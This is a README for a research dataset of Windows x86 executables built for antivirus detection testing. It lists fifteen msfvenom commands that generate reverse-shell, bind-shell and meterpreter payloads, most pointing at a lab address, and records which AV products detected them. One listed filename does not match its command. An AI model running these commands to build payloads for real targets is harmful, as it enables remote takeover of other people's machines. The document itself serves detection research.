# /data/raw/exe/x86

## Provenance

Creator: Oriol Lopez Petit
Version_date: 19 of April 2026
User: orionLP
Comments: As of time of writing, the dataset has been been created with msfvenom, as it is the tool that 
obtained the highest detection rate (datasets in raw are intended to be detected by all AVs tested).

## Testing

All files have been tested to work in a local setup (the setup being a simple client machine and a host machine with an AV installed),
and they have been tested to be detected by all the following AVs: AVAST-FREE, AVG-FREE, KASPERSKY (paid version), NORTON-BULLGUARD (paid version), BITDEFENDER.
 
## Files and their origin

In this folder each file is an x86 windows executable. Here is each of the files and the command that created them:

- `windows_encrypted_shell_reverse_tcp.exe`

   ```{bash}
   msfvenom --payload windows/encrypted_shell_reverse_tcp LHOST=10.0.2.15 -f exe -a x86 -o windows_encrypted_shell_reverse_tcp.exe
   ```

- `windows_powershell_bind_tcp.exe`

   ```{bash}
   msfvenom --payload windows/powershell_bind_tcp LHOST=10.0.2.15 -f exe -a x86 -o windows_powershell_bind_tcp.exe
   ```

- `windows_exec.exe`

   ```{bash}
   msfvenom --payload windows/exec CMD=calc.exe -f exe -a x86 -o windows_exec.exe
   ```

- `windows_powershell_reverse_tcp.exe`

   ```{bash}
   msfvenom --payload windows/powershell_reverse_tcp LHOST=10.0.2.15 -f exe -a x86 -o windows_powershell_reverse_tcp.exe
   ```

- `windows_meterpreter_bind_tcp.exe`

   ```{bash}
   msfvenom --payload windows/meterpreter_bind_tcp -f exe -a x86 -o windows_meterpreter_bind_tcp.exe
   ```

- `windows_powershell_reverse_tcp_ssl.exe`

   ```{bash}
   msfvenom --payload windows/powershell_reverse_tcp_ssl LHOST=10.0.2.15 -f exe -a x86 -o windows_powershell_reverse_tcp_ssl.exe
   ```

- `windows_meterpreter_reverse_http.exe`

   ```{bash}
   msfvenom --payload windows/meterpreter_reverse_http LHOST=10.0.2.15 -f exe -a x86 -o windows_meterpreter_reverse_http.exe
   ```

- `windows_shell_bind_hidden_ipknock_tcp.exe`

   ```{bash}
   msfvenom --payload windows/shell/bind_hidden_ipknock_tcp KHOST=10.0.2.15  -f exe -a x86 -o windows_shell_bind_hidden_ipknock_tcp.exe
   ```

- `windows_meterpreter_reverse_https.exe`

   ```{bash}
   msfvenom --payload windows/meterpreter_reverse_https LHOST=10.0.2.15 -f exe -a x86 -o windows_meterpreter_reverse_https.exe
   ```

- `windows_shell_bind_tcp.exe`

   ```{bash}
   msfvenom --payload windows/shell_bind_tcp -f exe -a x86 -o windows_shell_bind_tcp.exe
   ```

- `windows_meterpreter_reverse_tcp.exe`

   ```{bash}
   msfvenom --payload windows/meterpreter_reverse_tcp LHOST=10.0.2.15 -f exe -a x86 -o windows_meterpreter_reverse_tcp.exe
   ```

- `windows_shell_hidden_bind_tcp.exe`

   ```{bash}
   msfvenom --payload windows/shell_bind_tcp -f exe -a x86 -o windows_shell_bind_tcp.exe
   ```

- `windows_pingback_bind_tcp.exe`

   ```{bash}
   msfvenom --payload windows/pingback_bind_tcp -f exe -a x86 -o windows_pingback_bind_tcp.exe
   ```

- `windows_shell_reverse_tcp_rc4.exe`

   ```{bash}
   msfvenom --payload windows/shell/reverse_tcp_rc4  LHOST=10.0.2.15 -f exe -a x86 -o windows_shell_reverse_tcp_rc4.exe
   ```

- `windows_pingback_reverse_tcp.exe`

   ```{bash}
   msfvenom --payload windows/pingback_reverse_tcp  LHOST=10.0.2.15 -f exe -a x86 -o windows_pingback_reverse_tcp.exe
   ```

